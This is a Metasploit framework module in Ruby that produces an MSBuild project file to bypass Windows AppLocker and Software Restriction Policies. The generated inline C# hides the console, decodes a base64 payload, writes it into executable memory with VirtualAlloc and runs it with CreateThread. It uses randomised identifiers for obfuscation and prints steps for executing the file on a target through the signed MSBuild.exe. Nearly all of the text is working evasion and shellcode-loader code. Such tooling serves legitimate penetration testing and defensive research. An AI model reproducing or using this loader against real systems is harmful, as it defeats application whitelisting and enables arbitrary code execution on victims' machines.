##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Evasion

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Applocker Evasion - MSBuild',
      'Description' => %(
                         This module will assist you in evading Microsoft
                         Windows Applocker and Software Restriction Policies.
                         This technique utilises the Microsoft signed binary
                         MSBuild.exe to execute user supplied code.
                        ),
      'Author'      =>
        [
          'Nick Tyrer <@NickTyrer>', # module development
          'Casey Smith' # msbuild bypass research
        ],
      'License'     => 'MSF_LICENSE',
      'Platform'    => 'win',
      'Arch'        => [ARCH_X86, ARCH_X64],
      'Targets'     => [['Microsoft Windows', {}]],
      'References'  => [['URL', 'https://attack.mitre.org/techniques/T1127/']])
    )

    register_options(
      [
        OptString.new('FILENAME', [true, 'Filename for the evasive file (default: msbuild.txt)', 'msbuild.txt'])
      ]
    )
  end

  def build_payload
    Rex::Text.encode_base64(payload.encoded)
  end

  def instructions
    print_status "Copy #{datastore['FILENAME']} to the target"
    if payload.arch.first == ARCH_X86
      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\MSBuild.exe #{datastore['FILENAME']}"
    else
      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework64\\[.NET Version]\\MSBuild.exe #{datastore['FILENAME']}"
    end
  end

  def obfu
    Rex::Text.rand_text_alpha 8
  end

  def msbuild
    esc = build_payload
    mod = [obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu]
    <<~HEREDOC
      <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
      <Target Name="#{mod[0]}">
      <#{mod[1]} />
      </Target>
      <UsingTask
      TaskName="#{mod[1]}"
      TaskFactory="CodeTaskFactory"
      AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
      <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
      using System;
      using System.Runtime.InteropServices;
      using Microsoft.Build.Framework;
      using Microsoft.Build.Utilities;
      public class #{mod[1]} :  Task, ITask
      {
      private static Int32 #{mod[2]}=0x1000;
      private static IntPtr #{mod[3]}=(IntPtr)0x40;
      private static UInt32 #{mod[4]} = 0xFFFFFFFF;
      [System.Runtime.InteropServices.DllImport("kernel32")]
      private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);
      [System.Runtime.InteropServices.DllImport("kernel32")]
      private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);
      [System.Runtime.InteropServices.DllImport("kernel32")]
      private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
      [System.Runtime.InteropServices.DllImport("user32.dll")]
      static extern bool ShowWindow(IntPtr #{mod[5]}, int nCmdShow);
      [System.Runtime.InteropServices.DllImport("Kernel32")]
      private static extern IntPtr GetConsoleWindow();
      const int #{mod[6]} = 0;
      public override bool Execute()
      {
      IntPtr #{mod[5]};
      #{mod[5]} = GetConsoleWindow();
      ShowWindow(#{mod[5]}, #{mod[6]});
      string #{mod[7]} = "#{esc}";
      byte[] #{mod[8]} = Convert.FromBase64String(#{mod[7]});
      byte[] #{mod[9]} = #{mod[8]};
      IntPtr #{mod[10]} = VirtualAlloc(IntPtr.Zero, (UIntPtr)#{mod[9]}.Length, #{mod[2]}, #{mod[3]});
      System.Runtime.InteropServices.Marshal.Copy(#{mod[9]}, 0, #{mod[10]}, #{mod[9]}.Length);
      IntPtr #{mod[11]} = IntPtr.Zero;
      WaitForSingleObject(CreateThread(#{mod[11]}, UIntPtr.Zero, #{mod[10]}, #{mod[11]}, 0, ref #{mod[11]}), #{mod[4]});
      return true;
      }
      }
      ]]>
      </Code>
      </Task>
      </UsingTask>
      </Project>
    HEREDOC
  end

  def run
    file_create(msbuild)
    instructions
  end
end
